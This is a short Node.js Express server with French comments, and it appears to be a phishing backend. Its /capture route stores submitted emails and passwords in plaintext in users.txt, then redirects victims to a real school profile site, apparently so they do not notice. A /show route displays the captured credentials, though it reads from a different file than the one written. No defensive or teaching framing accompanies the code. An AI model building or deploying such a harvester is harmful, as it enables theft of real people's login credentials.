// Import des modules nécessaires
const express = require("express");
const bodyParser = require("body-parser");
const sqlite3 = require("sqlite3").verbose();
const path = require("path");
const fs = require("fs");

// Initialisation du serveur
const app = express();
const port = 3000;

// Middleware pour lire les données envoyées par les formulaires
app.use(bodyParser.urlencoded({ extended: true }));

// Servir les fichiers statiques (HTML, CSS, JS)
app.use(express.static(path.join(__dirname)));

// Route pour capturer les identifiants
app.post("/capture", (req, res) => {
  const { email, password } = req.body;
  fs.appendFileSync("users.txt", `Email: ${email} | Mot de passe: ${password}\n`);
  res.redirect("https://monprofil.ynov.com");
});

// Route pour afficher les identifiants capturés
app.get("/show", (req, res) => {
 const data = fs.readFileSync("donnees.txt", "utf8");
  res.send(`<pre>${data}</pre>`);
  });
;

// Lancer le serveur
app.listen(3000, () => {
  console.log("✅ Serveur en écoute sur http://localhost:3000");
});
